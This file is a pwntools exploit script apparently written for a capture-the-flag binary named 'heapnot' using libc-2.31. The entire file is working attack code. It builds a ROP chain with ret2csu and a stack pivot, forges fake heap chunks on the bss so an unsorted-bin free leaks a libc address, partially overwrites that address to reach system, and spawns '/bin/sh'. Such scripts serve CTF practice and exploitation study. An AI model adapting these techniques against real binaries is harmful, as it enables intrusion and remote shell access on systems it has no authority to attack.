from pwn import *
import time

#init

e = ELF('./heapnot')
libc = ELF('./libc-2.31.so')

context.binary = e

p = process(e.path)

#funcs

def chnk(x):
    return p64(x | 1).ljust(x, b'\x00')

#vars

csu1 = 0x401792
csu2 = 0x401778
arr = e.sym['not'] + 0x800
read_got = e.got['read']
free_off = libc.sym['free']
system_off = libc.sym['system']

log.info('Csu1 adr: ' + hex(csu1))
log.info('Csu2 adr: ' + hex(csu2))
log.info('Arr adr: ' + hex(arr))
log.info('Read got adr: ' + hex(read_got))
log.info('Free libc off: ' + hex(free_off))
log.info('System libc off: ' + hex(system_off))

#exploit

#get given partial libc off

p.recvuntil(': ')
libc_off = int(p.recvline(keepends = False), 16) - (free_off & 0xffffff)

log.info('Libc off adr: ' + hex(libc_off))

#rop write fake chunks on bss, free large chnk to get libc on bss, then ret2csu read and pivot to 2nd rop

rop = ROP(e)
rop.gets(arr)
rop.free(arr + 0x30)
#rop.ret2csu(0x0, arr, 0x33, call = read_got) #pwntools ret2csu not work :weary:
rop.call(csu1)
rop.raw(0x0) #rbx
rop.raw(0x1) #rbp
rop.raw(0x0) #r12/edi
rop.raw(arr) #r13/rsi
rop.raw(0x33) #r14/rdx
rop.raw(read_got) #r15/call ptr
rop.call(csu2)
for i in range(0x7):
    rop.raw(0x694201337) #filler
rop.migrate(arr + 0x20)

log.info('Main rop:\n' + rop.dump())

s = b'5'
s = s.ljust(0x38, b'\x00')
s += rop.chain()

p.sendline(s)

#send fake chunks with securities for unsorted bin free

s = p64(0)
s += chnk(0x20)
s += chnk(0x500)
s += chnk(0x20) * 2

p.sendline(s)

#send second rop and partial overwrite libc adr from unsorted bin to call system('/bin/sh')

rop = ROP(e)
rop.call(rop.rdi.address)
rop.raw(arr)

s = b'/bin/sh'
s = s.ljust(0x20, b'\x00')
s += rop.chain()
s += p64(libc_off + system_off)[:3]

p.send(s)

#reopen stdout

time.sleep(1)
p.sendline('exec 1>&2')

#pray for flag

p.interactive()
